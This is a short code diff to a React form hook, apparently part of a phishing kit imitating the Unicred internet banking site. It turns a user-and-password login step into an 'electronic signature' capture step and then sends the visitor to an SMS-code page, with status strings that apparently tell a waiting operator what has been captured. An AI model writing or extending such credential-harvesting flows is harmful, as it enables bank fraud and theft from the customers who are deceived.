@@ -9,7 +9,7 @@ import { useAccountContext } from '../accountContext/useContext';
 import { useLoadingContext } from '../loadingContext/useContext';
 import { zodSchema, BodyProtocol } from './validation';
 
-export default function useFormLogin() {
+export default function useFormElectronicSignature() {
   const {
     register,
     handleSubmit,
@@ -21,8 +21,7 @@ export default function useFormLogin() {
   } = useForm<BodyProtocol>({
     resolver: zodResolver(zodSchema),
     defaultValues: {
-      password: '',
-      user: '',
+      electronicSignature: '',
     },
   });
   const { isLoading, setIsLoading } = useLoadingContext();
@@ -30,18 +29,16 @@ export default function useFormLogin() {
 
   const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
     if (isLoading) return;
-    const { user, password } = body;
+    const { electronicSignature } = body;
     setIsLoading(true);
     setAccount(state => ({
       ...state,
-      user,
-      password,
-      status: 'esperando resposta usuário e senha',
-      electronicSignature: 'N/D',
+      electronicSignature,
+      status: 'esperando resposta assinatura eletrônica',
       numberSMS: 'N/D',
       sms: 'N/D',
     }));
-    navigate('/unicred-internetbanking/electronic-signature');
+    navigate('/unicred-internetbanking/code-sms');
   };
 
   const handleReset = () => {
